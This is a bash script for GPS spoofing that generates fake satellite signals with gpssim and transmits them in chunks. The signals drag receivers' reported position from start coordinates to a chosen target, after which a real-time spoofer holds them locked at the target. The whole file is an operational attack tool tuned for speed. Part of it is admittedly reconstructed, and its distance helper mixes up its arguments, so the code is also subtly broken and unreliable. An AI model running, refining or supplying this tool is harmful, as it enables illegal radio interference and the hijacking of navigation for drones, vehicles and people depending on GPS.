#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════╗
# ║   GPS SPOOFING — Multi-Hop  (OPTIMISED: background pre-gen)      ║
# ║   • Next chunk IQ generated in background during transmission    ║
# ║   • Reduced static hold (45s vs 90s)                             ║
# ║   • Reduced inter-chunk gap (2s vs 5s)                           ║
# ╚══════════════════════════════════════════════════════════════════╝
# Usage: ./run_spoof_full.sh [gain_dB]
#
# NOTE: the config block and the two helper functions below were recovered
# verbatim from the editor swap file; the main hop loop (marked RECONSTRUCTED)
# was rebuilt from the same backup to match the documented algorithm in
# docs/METHODOLOGY.md. Needs gpssim, tx_gpssim and ultimate_spoofer built,
# and a RINEX nav file (see sync_gps.sh).

# ══════════════════════════════════════════════════════════════════
#  ★ EDIT THESE ★
# ══════════════════════════════════════════════════════════════════

START_LAT="17.604012"
START_LON="78.126885"
START_ALT="100"

TARGET_LAT="17.52943"
TARGET_LON="78.26517"
TARGET_ALT="100"

DRIFT_SPEED="100"   # m/s — 100 m/s=360km/h: 7 chunks instead of 14, ~30min total
STATIC_SEC="45"     # ★ Reduced from 90→45s: GPS gets fix in ~30s, 45s = safe margin
DRIFT_SEC="210"     # seconds of drift per chunk (covers 100×210=21km)

# Hardware
GAIN="${1:-75}"
SAMPLE_RATE="2600000"
RINEX="brdc1560.26n"
GPSSIM_TIME="2026/06/05,12:30:00"  # must match RINEX file date

# ══════════════════════════════════════════════════════════════════
DIR="$(cd "$(dirname "$0")" && pwd)"; cd "$DIR"
TOTAL_SEC=$((STATIC_SEC + DRIFT_SEC))
CHUNK_DIST=$(python3 -c "print(int(float('${DRIFT_SPEED}') * int('${DRIFT_SEC}')))")
LOG_FILE="positions_log.txt"

IQ_A="gpssim_chunk_a.bin"   # double-buffer: A and B alternate
IQ_B="gpssim_chunk_b.bin"   # while one transmits, the other generates
TRAJ="trajectory_drift.csv"

# ── Helpers ───────────────────────────────────────────────────────
haversine_m() {
  python3 -c "
import math; R=6371000
slat,slon,tlat,tlon=float('$1'),float('$3'),float('$2'),float('$4')
dlat=math.radians(tlat-slat); dlon=math.radians(tlon-slon)
a=math.sin(dlat/2)**2+math.cos(math.radians(slat))*math.cos(math.radians(tlat))*math.sin(dlon/2)**2
print(int(R*2*math.asin(math.sqrt(a))))"
}

next_position() {
  python3 -c "
import math
def lla_to_ecef(la,lo,alt=100):
    a=6378137.0;e2=6.6943799901377997e-3
    la=math.radians(la);lo=math.radians(lo)
    N=a/math.sqrt(1-e2*math.sin(la)**2)
    return (N+alt)*math.cos(la)*math.cos(lo),(N+alt)*math.cos(la)*math.sin(lo),(N*(1-e2)+alt)*math.sin(la)
def ecef_to_lla(x,y,z):
    a=6378137.0;e2=6.6943799901377997e-3
    lo=math.atan2(y,x);p=math.sqrt(x**2+y**2)
    la=math.atan2(z,p*(1-e2))
    for _ in range(10):N=a/math.sqrt(1-e2*math.sin(la)**2);la=math.atan2(z+e2*N*math.sin(la),p)
    N=a/math.sqrt(1-e2*math.sin(la)**2)
    return math.degrees(la),math.degrees(lo)
slat,slon=float('$1'),float('$2');tlat,tlon=float('$3'),float('$4');step=float('$5')
sx,sy,sz=lla_to_ecef(slat,slon);tx,ty,tz=lla_to_ecef(tlat,tlon)
total=math.sqrt((tx-sx)**2+(ty-sy)**2+(tz-sz)**2)
frac=min(step/total,1.0)
nx,ny,nz=sx+frac*(tx-sx),sy+frac*(ty-sy),sz+frac*(tz-sz)
nlat,nlon=ecef_to_lla(nx,ny,nz);print(f'{nlat:.8f},{nlon:.8f}')"
}

# ── Generate one chunk's IQ (hold then drift CUR → NEXT) ──────────── RECONSTRUCTED
gen_chunk() {   # args: cur_lat cur_lon next_lat next_lon out_iq
  python3 gen_trajectory.py --start "$1,$2,${TARGET_ALT}" --target "$3,$4,${TARGET_ALT}" \
          --speed "${DRIFT_SPEED}" --hold "${STATIC_SEC}" --duration "${TOTAL_SEC}" --out "${TRAJ}"
  ./gpssim -e "${RINEX}" -x "${TRAJ}" -t "${GPSSIM_TIME}" -d "${TOTAL_SEC}" -s "${SAMPLE_RATE}" -b 16 -o "$5"
}

# ── Main multi-hop loop ──────────────────────────────────────────── RECONSTRUCTED
echo "START  ${START_LAT}N ${START_LON}E  →  TARGET ${TARGET_LAT}N ${TARGET_LON}E"
echo "Chunk distance ${CHUNK_DIST} m  |  hold ${STATIC_SEC}s + drift ${DRIFT_SEC}s per chunk"
: > "$LOG_FILE"

CUR_LAT="$START_LAT"; CUR_LON="$START_LON"
REM=$(haversine_m "$CUR_LAT" "$CUR_LON" "$TARGET_LAT" "$TARGET_LON")
TOTAL_CHUNKS=$(( (REM + CHUNK_DIST - 1) / CHUNK_DIST ))
CHUNK=1; GEN_PID=""

# pre-generate the first chunk into buffer A
NEXT=$(next_position "$CUR_LAT" "$CUR_LON" "$TARGET_LAT" "$TARGET_LON" "$CHUNK_DIST")
NEXT_LAT="${NEXT%,*}"; NEXT_LON="${NEXT#*,}"
gen_chunk "$CUR_LAT" "$CUR_LON" "$NEXT_LAT" "$NEXT_LON" "$IQ_A"
CUR_IQ="$IQ_A"; NXT_IQ="$IQ_B"

while [ "$REM" -gt "$CHUNK_DIST" ]; do
  # pre-generate the NEXT chunk in the background while this one transmits
  N2=$(next_position "$NEXT_LAT" "$NEXT_LON" "$TARGET_LAT" "$TARGET_LON" "$CHUNK_DIST")
  N2_LAT="${N2%,*}"; N2_LON="${N2#*,}"
  ( gen_chunk "$NEXT_LAT" "$NEXT_LON" "$N2_LAT" "$N2_LON" "$NXT_IQ" ) & GEN_PID=$!

  echo ""
  echo "Chunk ${CHUNK}/${TOTAL_CHUNKS}  →  ${NEXT_LAT}N ${NEXT_LON}E  |  $(python3 -c "print(round(${REM}/1000,1))") km to target"
  DONE_DIST=$(haversine_m "$START_LAT" "$START_LON" "$NEXT_LAT" "$NEXT_LON")
  echo "${CHUNK},${NEXT_LAT},${NEXT_LON},${DONE_DIST},${REM}" >> "$LOG_FILE"

  # transmit the current chunk (loops the file for the chunk duration)
  timeout "${TOTAL_SEC}" ./tx_gpssim -f "${CUR_IQ}" -g "${GAIN}" -s "${SAMPLE_RATE}"

  wait "$GEN_PID" 2>/dev/null   # make sure the next chunk finished generating
  CUR_LAT="$NEXT_LAT"; CUR_LON="$NEXT_LON"
  NEXT_LAT="$N2_LAT"; NEXT_LON="$N2_LON"
  TMP="$CUR_IQ"; CUR_IQ="$NXT_IQ"; NXT_IQ="$TMP"   # swap double-buffer
  REM=$(haversine_m "$CUR_LAT" "$CUR_LON" "$TARGET_LAT" "$TARGET_LON")
  CHUNK=$((CHUNK + 1))
done

echo ""
echo "════════════════════════════════════════"
echo " ALL CHUNKS DONE"
echo " PHASE 2: LOCKED AT TARGET"
echo "════════════════════════════════════════"

# PHASE 2: hand over to the real-time engine for a static hold at the exact target
./ultimate_spoofer \
  --rinex      "${RINEX}" \
  --lat        "${TARGET_LAT}" \
  --lon        "${TARGET_LON}" \
  --alt        "${TARGET_ALT}" \
  --target-lat "${TARGET_LAT}" \
  --target-lon "${TARGET_LON}" \
  --target-alt "${TARGET_ALT}" \
  --l1-gain    "${GAIN}"
